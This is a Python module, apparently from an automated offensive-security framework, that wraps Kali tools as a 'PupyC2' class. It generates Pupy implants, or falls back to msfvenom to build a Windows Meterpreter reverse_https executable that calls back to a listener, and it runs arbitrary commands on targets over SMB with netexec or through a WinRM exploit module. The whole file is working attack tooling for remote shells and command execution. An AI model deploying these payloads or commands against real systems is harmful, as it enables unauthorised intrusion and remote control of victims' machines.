import shlex, shutil, os
from typing import Optional
from ..kali_tools_client import kali


class PupyC2:
    def __init__(self):
        self._client = kali

    @property
    def available(self) -> bool:
        try:
            result = self._client.run("pupy", "--help", timeout=10)
            return "error" not in result
        except Exception:
            return False

    async def deploy_payload(self, target: str, os_type: str = "windows",
                              listener: str = "0.0.0.0:443") -> dict:
        result = await self._client.run("pupy", f"gen --os {shlex.quote(os_type)} --listener {shlex.quote(listener)}", timeout=120)
        if result.get("error"):
            listener_host = shlex.quote(listener.split(':')[0])
            listener_port = shlex.quote(listener.split(':')[1] if ':' in listener else '443')
            result2 = await self._client.run("msfvenom", f"-p windows/x64/meterpreter/reverse_https LHOST={listener_host} LPORT={listener_port} -f exe -o /tmp/payload.exe", timeout=120)
            if result2.get("error"):
                return {"error": "No C2 framework available (pupy + msfvenom both down). Deploy agent manually."}
            return {"target": target, "payload": "/tmp/payload.exe", "generator": "msfvenom", "raw": result2}
        return {"target": target, "payload": result.get("output", ""), "generator": "pupy", "raw": result}

    async def execute(self, target_ip: str, command: str, protocol: str = "smb") -> dict:
        if protocol == "winrm":
            from .winrm_exploit import WinRMExploit
            wr = WinRMExploit()
            return await wr.execute(target_ip, command)
        result = await self._client.run("netexec", f"{shlex.quote(protocol)} {shlex.quote(target_ip)} -X {shlex.quote(command)}", timeout=60)
        if result.get("error"):
            return {"target": target_ip, "error": result["error"]}
        return {"target": target_ip, "output": result.get("stdout", "")[:2000], "raw": result}
